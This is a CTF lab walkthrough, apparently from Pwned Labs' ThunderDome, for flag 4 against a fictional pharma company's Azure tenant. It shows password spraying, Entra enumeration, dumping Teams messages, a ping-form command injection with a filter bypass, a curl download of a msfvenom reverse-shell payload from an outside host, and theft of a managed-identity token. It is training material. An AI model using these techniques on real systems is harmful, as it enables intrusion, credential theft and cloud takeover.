---
title: ThunderDome -  Flag 4 - A new wave (web of deceit)
parent: ThunderDome CTF
nav_order: 4
---

# ThunderDome -  Flag 4 - A new wave (web of deceit)
{: .no_toc }


## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Recap

In flag 3, we used Nacer’s M365 refresh token to acquire a new access token. This led to some M365 email pillaging which gave us a password we could use to spray a bunch of usernames we obtained. We were then able to access the Azure portal and discover a deleted blob containing hashes passwords - we managed to crack one of them and get a password, which we added to our stash. After that, flag 3 and some more credentials were discovered via a Function App API endpoint which was vulnerable to time-based SQL injection.

## Next steps

We have the following credentials to work with:

Username - `nina` 

Password - `wcy4^UV%#^hv35C@^!` 

Since our recent findings were in Azure, let’s try the above credentials with Azure as well. In flag 3 we used a tool called MSOLSpray to password spray a list of M365 users. There’s another tool we can use to password spray, validate M365 users, credentials and domains, called *Oh365UserFinder*. You can download it from here - [https://github.com/dievus/Oh365UserFinder](https://github.com/dievus/Oh365UserFinder). The target is still Massive Pharma so let’s add the domain `@massive-pharma.com` to the user `nina` and add this username to a file called `nina.txt`. Now we can run  `oh365userfinder`:

```bash
python3 ./oh365userfinder.py -p 'wcy4^UV%#^hv35C@^!' --pwspray --elist nina.txt
```

![img]({{ '/assets/images/flag4/Untitled.png' | relative_url }}){: .center-image }

The credentials appear to be valid. We could just go straight to the Azure portal and try to sign in, but let’s run the credentials through *MFASweep* and see if we can determine what MFA and Conditional Access Policy information we can gather with respect to accessing Microsoft APIs. Download the tool from here [https://github.com/dafthack/MFASweep](https://github.com/dafthack/MFASweep). Start powershell (I’m running it on my Kali box) and run the following:

> Note - make sure the password is typed correctly so you don’t lock out the account - you are reminded of this by MFASweep:
> 
> 
> ```powershell
> Confirm MFA Sweep
> [*] WARNING: This script is about to attempt logging into the [nina@massive-pharma.com](mailto:nina@massive-pharma.com) account TEN (10) different times (11 if you included ADFS). If
> you entered an incorrect password this may lock the account out. Are you sure you want to continue?
> ```
> 

```powershell
Import-Module ./MFASweep/MFASweep.ps1
Invoke-MFASweep -Username nina@massive-pharma.com -Password 'wcy4^UV%#^hv35C@^!' -Recon

```
![img]({{ '/assets/images/flag4/Untitled 1.png' | relative_url }}){: .center-image }

Once it’s finished, any Single Factor access vectors (no MFA) will be marked with a `YES` :

![img]({{ '/assets/images/flag4/Untitled 2.png' | relative_url }}){: .center-image }

Note the highlighted output above. It appears we may be able to authenticate to the Microsoft Graph API **(we covered this in flag 3 where we used GraphRunner) and the Microsoft Service Management API which is leveraged by tools like the Azure CLI and PowerShell `Az` module.

You may ask why the Azure Portal isn’t mentioned. MFASweep looks at access to API services:

![img]({{ '/assets/images/flag4/Untitled 3.png' | relative_url }}){: .center-image }

Let’s try and log in via the Azure Portal:

![img]({{ '/assets/images/flag4/Untitled 4.png' | relative_url }}){: .center-image }

Success. When browsing resources I got the following prompt:

![img]({{ '/assets/images/flag4/Untitled 5.png' | relative_url }}){: .center-image }

There could be a few reasons for this error. In this case it may be due to Conditional Access Policies or MFA requirements. We don’t need to concern ourselves with the Storage accounts, let’s check out the `supplychain-mgmt` App Service:

![img]({{ '/assets/images/flag4/Untitled 6.png' | relative_url }}){: .center-image }

The above highlights show `supplychain-mgmt` is a Windows “Web app”. Let’s click on the `Default domain` URL:

![img]({{ '/assets/images/flag4/Untitled 7.png' | relative_url }}){: .center-image }

Nothing interesting on the page. There are some buttons which don't appear to do anything:

![img]({{ '/assets/images/flag4/Untitled 8.png' | relative_url }}){: .center-image }

It appears there’s nothing particularly interesting on the Massive Pharma Supply Chain Management page. Before moving on, let’s see if the WebApp gives any useful back-end information. In the Inspector window navigate to the `Network` tab, and click reload to refresh the page and capture network traffic. The first entry you should see is a `GET` for `/`. Looking at the response headers we can see the back-end is running an IIS web server and `ASP.NET` web framework:

![img]({{ '/assets/images/flag4/Untitled 9.png' | relative_url }}){: .center-image }

Let’s collect our thoughts and consider what our next steps could be:

💭 We know the Operating System is Windows

💭 We know the web server is `IIS` running `ASP.NET`

💭 We know this is a WebApp 

💭 What permissions does this WebApp have?

💭 How are permissions assigned to it?

Take the first two points above - Windows OS and an `IIS` web server running `ASP.NET`. Think back to flag 1 where I discussed enumeration:

> The `nmap` output shows the host is running Linux and the site is being served via `Apache`. This is useful to know when looking for potential files with certain extensions (e.g., what you would expect to find hosted on an `IIS` box vs `Apache` box). The key point is use some intelligence in your enumeration for better results.
> 

We could run an enumeration tool against the WebApp, and using the intelligence we’ve gathered, focus on directories and file types (`.aspx`) you’d find running on  `ASP.NET`.

There’s also another option. Remember the results of MFASweep we ran earlier? It suggested we may be able to to run Azure CLI commands. Let’s see what we can do with `az cli` and check settings for the WebApp to see if we can find something useful. We’ll try and log in using `az login`:

```bash
└─# az login -u nina@massive-pharma.com -p 'wcy4^UV%#^hv35C@^!'                 
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "2522da8b-d801-40c4-88bf-1944eae9d237",
    "id": "41b63b94-5bb3-41b2-a2ad-2b411979dc26",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Azure subscription 1",
    "state": "Enabled",
    "tenantId": "2522da8b-d801-40c4-88bf-1944eae9d237",
    "user": {
      "name": "nina@massive-pharma.com",
      "type": "user"
    }
  }
]

```

Success. This give us the ability to enumerate manually and also via automated mechanisms - more on that a bit later. Let’s see if we can gather more information on the WebApp:

```bash
az webapp list --output table
```

![img]({{ '/assets/images/flag4/Untitled 10.png' | relative_url }}){: .center-image }

Using the output above, we can craft a more refined query:

```bash
az webapp config show --name supplychain-mgmt --resource-group MP-PROD-2
```

A whole bunch of useful information is returned but there’s something in particular that stands out:

```json
"defaultDocuments": [
    "index.html",
    "Home.aspx"
],
```

Default documents in Azure WebApps specify which file(s) should be served when someone requests the root URL. Multiple documents can exist in a configured order. The above output shows `index.html` as the first default document returned when you visit the [`https://supplychain-mgmt.azurewebsites.net/`](https://supplychain-mgmt.azurewebsites.net/) URL. What happens when we request `Home.aspx`? Let’s find out - go to the URL [`https://supplychain-mgmt.azurewebsites.net/Home.aspx`](https://supplychain-mgmt.azurewebsites.net/Home.aspx):

![img]({{ '/assets/images/flag4/Untitled 11.png' | relative_url }}){: .center-image }

This looks promising - but we need login credentials. No usernames/passwords we collected previously (including Nina’s current credentials) worked, so let’s come back to the WebApp later and move on to see what else we can do.

## ROADRecon

Time for some automated enumeration. Download ROADrecon from - [https://github.com/dirkjanm/ROADtools](https://github.com/dirkjanm/ROADtools). ROADrecon is a powerful tool which can be used to gain Entra ID situational awareness or look for new attack paths. Once you’ve downloaded it, authenticate to Entra ID with:

```bash
roadrecon auth -u nina@massive-pharma.com -p 'wcy4^UV%#^hv35C@^!'
```

You’ll get a message saying `Tokens were written to .roadtools_auth`. Now we can start gathering Entra ID (Azure AD) information by running:

```bash
roadrecon gather 
```

> Note - the information gathered is within Nina’s permissions scope.
> 

ROADrecon will then cycle through its gathering phases:

![img]({{ '/assets/images/flag4/Untitled 12.png' | relative_url }}){: .center-image }

### Conditional Access Policies

Once the data gathering has completed there are a number of useful functions available to us. One of the first things I like to do is see if Conditional Access Policy information has been collected. To do this, we can run:

```bash
roadrecon plugin policies
```

This should generate a file called `caps.html`. Load this file with a browser, e.g., `firefox caps.html` and you should see something like this:

![img]({{ '/assets/images/flag4/Untitled 13.png' | relative_url }}){: .center-image }

We now have insight into MFA configuration via Conditional Access Policies. For Nina we can see applications excluded from MFA - `Windows Azure Service Management API, Microsoft Graph Command Line Tools`. This aligns with the MFASweep output we saw earlier. Add this output to your stash as it will be very helpful for later flags.

### ROADrecon GUI

We can gain a wealth of information from the ROADrecon GUI. To start the GUI run:

```bash
roadrecon gui
```

You should see the following. I’ve highlighted some important areas:

![img]({{ '/assets/images/flag4/Untitled 14.png' | relative_url }}){: .center-image }

Clicking on *Users* and then *Nina* we can retrieve additional information about the user:

![img]({{ '/assets/images/flag4/Untitled 15.png' | relative_url }}){: .center-image }

Nina’s owned objects - we see three devices:

![img]({{ '/assets/images/flag4/Untitled 16.png' | relative_url }}){: .center-image }

Groups Nina can see:

![img]({{ '/assets/images/flag4/Untitled 17.png' | relative_url }}){: .center-image }

Administrative units:

![img]({{ '/assets/images/flag4/Untitled 18.png' | relative_url }}){: .center-image }

> Administrative units allow you to delegate administrative permissions to a collection of Entra ID users and groups
> 

We won’t dive into more detail, you can explore at your leisure, but let’s check out the *Service Principals* tab. Remember earlier when we were listing observations we made regarding the WebApp? There were two we didn’t address:

💭 What permissions does this WebApp have?

💭 How are permissions assigned to it?

In order for an Azure resource such as a WebApp to interact with other Azure resources, a *Managed Identity* can be assigned to it. This has benefits such as avoiding hard coding credentials in code and configuring fine-grained *RBAC* (Role Based Access Control). Managed Identities provide token-based authentication; however, if a token is obtained by an attacker, it can be used to gain unauthorised access to Azure resources which is what we hope to do!

Click on *Service Principals* and see if you can find anything related to the WebApp:

![img]({{ '/assets/images/flag4/Untitled 19.png' | relative_url }}){: .center-image }

There’s something called `supplychain-mgmt` - this looks interesting, let’s check it out. Click on it and go to the `Raw` tab. There’s quite a bit of information so you may want to copy and paste it into a text editor for easier review. We note the following:

```json
managedIdentityResourceId:"/subscriptions/41b63b94-5bb3-41b2-a2ad-2b411979dc26/resourcegroups/MP-PROD-2/providers/Microsoft.Web/sites/supplychain-mgmt"
```

This looks like a reference to the `supplychain-mgmt` WebApp in the `MP-PROD-2` Resource Group. We could also have run:

```bash
az ad sp list --display-name supplychain-mgmt
```

It would have returned information linking it to the WebApp:

```json
"alternativeNames": [
      "isExplicit=False",
      "/subscriptions/41b63b94-5bb3-41b2-a2ad-2b411979dc26/resourcegroups/MP-PROD-2/providers/Microsoft.Web/sites/supplychain-mgmt"
    ]
```

We now know there is a Managed Identity associated with the WebApp worth pursuing. It looks like we’ll have to compromise the WebApp to see if we can gain access to this identity - as mentioned previously, we may be able to obtain a token which allows us to move deeper within Massive Pharma and on to the next flag.

## M365

Let’s turn our attention to another attack vector. Perhaps Nina has been speaking to colleagues in Teams and divulged some sensitive information in chats. To progress this line of investigation, we’ll use a tool called AADInternals - [https://github.com/Gerenios/AADInternals](https://github.com/Gerenios/AADInternals). Documentation can be found here - [https://aadinternals.com/aadinternals/](https://aadinternals.com/aadinternals/). It’s a PowerShell module which can be installed by running `Install-Module AADInternals`. Once installed, run:

```powershell
Get-AADIntAccessTokenForTeams -SaveToCache
```

We enter Nina’s credentials when prompted for an email and password:

![img]({{ '/assets/images/flag4/Untitled 20.png' | relative_url }}){: .center-image }

Let’s get a list of Microsoft Teams Nina is a member of:

```powershell
Get-AADIntMyTeams
```
![img]({{ '/assets/images/flag4/Untitled 21.png' | relative_url }}){: .center-image }

We can dump teams messages with:

```powershell
Get-AADIntTeamsMessages
```

This will return messages along with a bunch of other stuff we’re not interested in right now. Let’s filter the results:

```powershell
Get-AADIntTeamsMessages | Format-List ArrivalTime,DisplayName,content
```

![img]({{ '/assets/images/flag4/Untitled 22.png' | relative_url }}){: .center-image }

We’ve found a password - `MPWeb@dm1n33!`… add that to your loot. What’s more, it refers to a “web app” - this could be what we need to login to the Massive Pharma Supply Chain Management application we found, so let’s head back there. 

## Accessing the Supply Chain Management WebApp

I tried a whole bunch of different usernames with the password we just found, including the usernames we saved as `flag3_users.txt` in flag 3. No joy. I tried `admin` and managed to log in - never ignore the obvious.

After logging in, we are presented with this:

![img]({{ '/assets/images/flag4/Untitled 23.png' | relative_url }}){: .center-image }

There are a number of opportunities available to us here. Let’s walk the happy path first and see how this site operates. I tried various hostnames and IP addresses including `1.1.1.1` and `127.0.0.1`, etc., and got the following message:

![img]({{ '/assets/images/flag4/Untitled 24.png' | relative_url }}){: .center-image }

When forcing an error, we learn that the WebApp is calling the `ping` command at the back-end:

![img]({{ '/assets/images/flag4/Untitled 25.png' | relative_url }}){: .center-image }

An obvious vulnerability to check for here would be command injection - check out this link on PayloadsAllTheThings for more information - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection).

I tried various payloads and managed to achieve some success with `|`:

![img]({{ '/assets/images/flag4/Untitled 26.png' | relative_url }}){: .center-image }

Okay so what does `iis apppool\supplychain-mgmt` mean? It refers to the identity of an IIS application pool named `supplychain-mgmt`. The identity is a local account created by IIS, see here for more information - [https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities#application-pool-identity-accounts](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities#application-pool-identity-accounts). 

We’ve already ascertained the host is running Windows, so let’s try and run some commands to gather more information. I had to chain a couple of characters (`|` and `\`) to run commands on the host - for example, to check the defined PATH we can run `127.0.0.1|echo\%PATH%`:

![img]({{ '/assets/images/flag4/Untitled 27.png' | relative_url }}){: .center-image }

Some of the `PATH` entries are interesting:

`C:\Python27` - Python

`C:\Program Files (x86)\nodejs` - JavaScript

`C:\Windows\System32\OpenSSH` - may be SSH services running

`C:\Program Files\Microsoft Network Monitor 3` - potentially capture network traffic

`C:\Program Files\Git\cmd` - potentially look for repositories

`C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u392\bin` - Java

`C:\Program Files (x86)\Mercurial` - potentially look for repositories

That’s a whole bunch of potential rabbit holes (cheers Ian!)

## MSI endpoint

We’ll leave the above for now and see if we can pull the environment variables with `127.0.0.1|SET`. A fair amount of information is returned but some entries grab our attention:

```powershell
MSI_ENDPOINT=http://127.0.0.1:41299/msi/token/
MSI_SECRET=A23EF88FD0284B859B0B0B68FAC8BF9E
IDENTITY_ENDPOINT=http://127.0.0.1:41299/msi/token/
IDENTITY_HEADER=A23EF88FD0284B859B0B0B68FAC8BF9E
```

The `MSI_ENDPOINT` (Managed Service Identity) and `IDENTITY_ENDPOINT` refer to local endpoints which can be called to request an access token. The `MSI_SECRET` and `IDENTITY_HEADER` are variables used to authenticate requests to the endpoints. It looks like what we need to do now is call this endpoint somehow and try to obtain an access token. We can try to manipulate the `MSI_ENDPOINT` using command injection and browse the host for a flag or other interesting loot, but let’s see if we can use command injection to get a shell on the host. There may be a challenge to this, however. We’ll need to initiate a shell using native tools on the host, or pull down a backdoor we crafted ourselves. The latter might trigger EDR services but we’ll see.

The first thing we need to do is craft a command injection payload that can download a backdoor we have hosted somewhere. The easiest way to download something would be to use `cURL` or similar. Let’s see if `cURL` is installed on the host. Checking the current directory via `127.0.0.1|cd` we get  `C:\Windows\system32`. I ran a `dir` and checked the output and saw that `cURL` was present.

## Metasploit

There are many good tutorials out there on Metasploit so I’m not going going to go into too much detail. If you want more information about it, a good place to start would be here - [https://www.metasploit.com/](https://www.metasploit.com/). We’re going to generate a backdoor payload which we can download onto the Supply Chain Management WebApp. Since we’re going to serve the backdoor over the Internet, we will need to spin up a VM in Cloud land. Once you’ve done that, run the following (make sure Metasploit is installed on your VM - I used a Kali VM), replacing the variables with your own values:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<VM public IP> LPORT=<listener port> -f exe -o foo.exe
```

We now need to make the payload available over the Internet:

```bash
python3 -m http.server 8000
```

> Note - the above command will serve files from the directory in which it’s run. To specify another directory add `--directory /<path>` to the end of the command.
> 

## Crafty command injection

Here is the `cURL` request we want to execute (values are ones I used). We want to save to `C:\home` because it's likely we'll have permissions to save and execute there:

```bash
curl -o \home\foo.exe [http://51.141.239.109:8000/foo.exe](http://51.141.239.109:8000/perfview.exe)
```

All of this sounds simple enough, but let’s try and run this command using the command injection technique we’ve been using:

```bash
127.0.0.1|echo\curl -o \home\foo.exe http://51.141.239.109:8000/foo.exe
```

![img]({{ '/assets/images/flag4/Untitled 28.png' | relative_url }}){: .center-image }

The command didn’t work because spaces in the command are not being accepted and we get the error message `Certain characters are not allowed.`. I was stumped for a bit on how to get around this. Turns out there’s a technique called substring manipulation. We can use the string `%PATH:~22,1%` to represent a space. Here’s `%PATH%` on the host:

```bash
C:\Python27;C:\Program Files (x86)\nodejs;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Microsoft Network Monitor 3\;C:\Users\packer\AppData\Roaming\npm;C:\Program Files (x86)\nodejs\;C:\Program Files (x86)\Mercurial\;c:\Program Files (x86)\Microsoft ASP.NET\ASP.NET Web Pages\v1.0\;C:\Program Files (x86)\dotnet;C:\Program Files\dotnet;C:\Program Files\Git\cmd;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps;C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u392\bin;
```

`~22` means count 23 characters (zero-based index) and `1` means only one character should be extracted - this gives us the space after the first `Program Files` in the `%PATH%` output above. This is also a good way to obfuscate malicious code (it may be harder for automated tools to detect what’s going on). Let’s craft our command injection again:

```bash
127.0.0.1|curl%PATH:~22,1%-o%PATH:~22,1%\home\foo.exe%PATH:~22,1%[http://51.141.239.109:8000/foo.exe](http://51.141.239.109:8000/foo.exe)
```

If you now run `127.0.0.1|dir\home` you should find the payload has been downloaded. It might be a good idea to run this command if you encounter any errors when trying to download the payload (errors may show up in your `http.server` activity log), to check that a file with the same name as your payload doesn’t already exist.

## Shell on the host

We’ll now startup `msfconsole` on the VM provisioned in the Cloud, so it’s ready to catch the shell when we run our backdoor payload on the WebApp. When it loads, run the following:

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 0.0.0.0 # 0.0.0.0 to avoid binding issues
set LPORT 1337 # or whatever port you chose when generating the payload
exploit

```

![img]({{ '/assets/images/flag4/Untitled 29.png' | relative_url }}){: .center-image }

Now run the payload we downloaded onto the WebApp:

```bash
127.0.0.1|\home\foo.exe
```

We should now see the sell in Metasploit:

![img]({{ '/assets/images/flag4/Untitled 30.png' | relative_url }}){: .center-image }

Unless you have multiple other shells running, we can connect to this session with the command `shell`. This should drop us into WebApp’s Windows command line:

![img]({{ '/assets/images/flag4/Untitled 31.png' | relative_url }}){: .center-image }

Since we’ve had some success working with `C:\home` let’s head there and look around. After some browsing this path looked interesting - `C:\home\site\wwwroot\for-transfer`:

![img]({{ '/assets/images/flag4/Untitled 32.png' | relative_url }}){: .center-image }

We should grab that `.zip` file. Also, looks like some of the Pwned Labs ThunderDomers have left their footprints 😄 here:

![img]({{ '/assets/images/flag4/Untitled 33.png' | relative_url }}){: .center-image }

To download the `.zip` file, exit the shell with `exit`. If you now run `pwd` at the `meterpreter >` prompt, you’ll find it’s not `C:\home\site\wwwroot\for-transfer` which is where we were in the shell when we left it, so we’ll need to use the absolute path of the file(s) we want to download (note the double backslashes `\\`):

```bash
download c:\\home\\site\\wwwroot\\for-transfer\\sql-backup-0207-transfer.zip
```

The file will be downloaded to wherever we ran `msfconsole` from. To download it somewhere else, append the local path to the above command.

## Flag 4

In another terminal tab, let’s check out the `.zip` file. The following files are extracted:

```bash
ExportedTemplate-MP-PROD1.zip
flag.txt
initial-config.sql
```

There’s flag 4! Submit it and come back to `initial-config.sql`:

```bash
USE master;
EXEC sp_configure 'contained database authentication', 1;
RECONFIGURE;
ALTER DATABASE analysis SET CONTAINMENT = PARTIAL;
USE analysis;
CREATE USER db_access WITH PASSWORD = 'ECJy5u53c7cJT!!';
EXEC sp_addrolemember 'db_datareader', 'db_access';               
```

Looks like some database credentials. Add those to your loot. We’ll look at the `ExportedTemplate-MP-PROD1.zip` in flag 5.

## Access token

We’re not done yet because we still need to explore the `MSI_ENDPOINT` remember? For a recap head back to here - [MSI endpoint](https://www.notion.so/MSI-endpoint-f45b07dd816b414cab8ed809c04c486b?pvs=21). Let’s jump back to the terminal with `msfconsole` running and back into the shell with `shell`. Here’s how we want to leverage `MSI_ENDPOINT` and `MSI_SECRET`:

```bash
curl -H "Secret: 7FB338EA458946DC9A5A1A6C0D49AF63" "http://127.0.0.1:41022/msi/token/?resource=https://management.azure.com/&api-version=2017-09-01"
```

If you’re wondering where the `?resource=https://management.azure.com/&api-version=2017-09-01` came from:

- `resource=https://management.azure.com/` - we’re requesting a token for the Azure Management API
- `api-version=2017-09-01` - API version, funnily enough

If you get an error like `curl: (7) Failed to connect to 127.0.0.1 port 41101 after 0 ms: Couldn't connect to server` when you run the `cURL` command, run `127.0.0.1|SET` on the Supply Chain Management WebApp via command injection again to see whether the `MSI_SECRET` or `MSI_ENDPOINT` details have changed (`Secret` value or port number for the endpoint). Once you’ve executed the `cURL` command you should receive a token in response:

![img]({{ '/assets/images/flag4/Untitled 34.png' | relative_url }}){: .center-image }

Make sure you’ve stashed the contents of `sql-backup-0207-transfer.zip`, the database credentials and access token. See you in flag 5. Remember - SQL Servers need friends too…
